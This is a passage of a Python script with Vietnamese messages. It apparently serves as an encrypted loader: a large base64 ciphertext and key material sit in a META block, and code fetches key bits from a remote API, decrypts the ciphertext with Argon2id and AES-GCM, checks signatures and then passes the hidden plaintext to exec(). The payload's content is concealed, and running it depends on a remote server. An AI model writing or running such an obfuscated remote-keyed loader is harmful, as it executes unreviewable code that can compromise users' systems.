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",
  "public_pem": "-----BEGIN PUBLIC KEY-----\nMIGbMBAGByqGSM49AgEGBSuBBAAjA4GGAAQBc1MOPPKIFl2tRITFTKIlr1WsTZCqoKfTsFIrk7lq\njSsSUl022AVWJOtFcEkRw4xY/vgH6KS+JZQMApHjdYkYEYYB41DNYYuisyD1xE9+UvF3pJraYjWE\n9J8G9g+BMgQKS/XgzKYPDWqit5aqSMyhf8lWn/RYgN4uhcZ3pFyT3T45nR8=\n-----END PUBLIC KEY-----\n"
}
def from_bitstring(s: str) -> bytes:
    pad = (8 - (len(s) % 8)) % 8
    if pad:
        s = s + ("0"*pad)
    return bytes(int(s[i:i+8], 2) for i in range(0, len(s), 8))

def find_meta_from_api(enc_id, api_url):
    try:
        r = requests.get(api_url, timeout=10)
        r.raise_for_status()
        arr = r.json()
        if not isinstance(arr, list):
            return None
        for obj in arr:
            if isinstance(obj, dict) and obj.get("enc_id") == enc_id:
                bits = obj.get("meta_bits")
                if isinstance(bits, str):
                    return bits
    except Exception as e:
        print("Lỗi khi lấy metadata từ API:", e)
    return None

def main():
    enc_id = META["enc_id"]
    api_url = META["api_url"]
    bits = find_meta_from_api(enc_id, api_url)
    if not bits:
        print("Không tìm thấy enc_id trên API hoặc error.")
        return
    raw = from_bitstring(bits)
    # header 3 * uint32
    if len(raw) < 12:
        print("Meta không hợp lệ")
        return
    a,b,c = struct.unpack(">III", raw[:12])
    off = 12
    base_key = raw[off:off+a]; off += a
    sig_plain = raw[off:off+b]; off += b
    sig_cipher = raw[off:off+c]; off += c

    # phái sinh key qua Argon2id (phải trùng với cách tạo file encryptor)
    salt = base64.b64decode(META["salt_b64"])
    enc_key = hash_secret_raw(base_key, salt, time_cost=2, memory_cost=65536, parallelism=1, hash_len=32, type=Type.ID)

    # giải mã AES-GCM
    nonce = base64.b64decode(META["nonce_b64"])
    tag = base64.b64decode(META["tag_b64"])
    cipher_b = base64.b64decode(META["cipher_b64"])
    try:
        cipher = AES.new(enc_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(cipher_b, tag)
    except Exception as e:
        print("Giải mã thất bại:", e)
        return

    # verify signatures
    vk = VerifyingKey.from_pem(META["public_pem"])
    try:
        vk.verify(sig_plain, plaintext)
    except Exception as e:
        print("Chữ ký plaintext không hợp lệ:", e)
        return
    try:
        vk.verify(sig_cipher, nonce + cipher_b + tag)
    except Exception as e:
        print("Chữ ký ciphertext không hợp lệ:", e)
        return

    # exec
    try:
        exec(plaintext.decode('utf-8'), globals())
    except Exception as e:
        print("Lỗi khi chạy code giải mã:", e)

if __name__ == "__main__":
    main()
